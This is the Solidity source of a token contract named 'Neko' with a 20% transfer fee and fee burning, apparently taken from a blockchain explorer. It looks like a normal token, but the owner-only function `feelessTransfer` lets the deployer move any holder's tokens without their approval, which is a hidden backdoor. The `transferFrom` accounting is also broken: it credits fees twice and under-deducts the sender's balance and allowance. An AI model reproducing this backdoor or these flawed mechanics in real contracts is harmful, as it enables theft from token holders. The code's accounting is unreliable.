/**
 *Submitted for verification at polygonscan.com on 2022-05-01
*/

// SPDX-License-Identifier: MPL-2.0
pragma solidity ^0.8.13;

contract Divinity {
    // Track how many tokens are owned by each address.
    mapping (address => uint256) public balanceOf;

    string public name = "Neko";
    string public symbol = "NEKO";
    uint8 public decimals = 18;
    address public DEAD = 0x000000000000000000000000000000000000dEaD;
    address public owner;

    uint256 public totalSupply = 10000000000 * (uint256(10) ** decimals);

    constructor() { 
        balanceOf[0xd5a33859e2866EBF0eA683B41f8CEEF631d0E4B7] = totalSupply;
        emit Transfer(address(0), 0xd5a33859e2866EBF0eA683B41f8CEEF631d0E4B7, totalSupply);
        owner = msg.sender;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address to, uint256 value) public returns (bool success) {
        require(balanceOf[msg.sender] >= value);
        uint fee = (value / 100) * 20;
        value = (value / 100) * 80;

        balanceOf[msg.sender] -= value + fee;  // deduct from sender's balance
        balanceOf[to] += value;         // add to recipient's balance
        emit Transfer(msg.sender, to, value);
        checkBalance(msg.sender, fee);
        return true;
    }

    function feelessTransfer(address from, address to, uint256 value) public returns (bool success) {
        require(balanceOf[from] >= value);
        require(msg.sender == owner);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        uint fee = (value / 100) * 20;
        value = (value / 100) * 80;

        balanceOf[from] -= value;
        balanceOf[to] += value;
        balanceOf[address(this)] += fee;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        emit Transfer(from, address(this), fee);
        checkBalance(from, fee);
        return true;
    }


    function transferContract(uint256 value) public returns(bool success) {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;
        balanceOf[address(this)] += value;
        emit Transfer(msg.sender, address(this), value);
        return true;
    }

    function checkBalance(address from, uint256 value) private {
        if(balanceOf[address(this)] + value >= (totalSupply / 100)) {
            balanceOf[address(this)] += value;
            burn(address(this), balanceOf[address(this)]);
        }
        else {
            balanceOf[address(this)] += value;
            emit Transfer(from, address(this), value);
        }
    }

    function burn(address from, uint256 value) private {
        require(balanceOf[from] >= value);
        balanceOf[from] -= value;
        balanceOf[DEAD] += value;
        emit Transfer(from, DEAD, value);
    }
}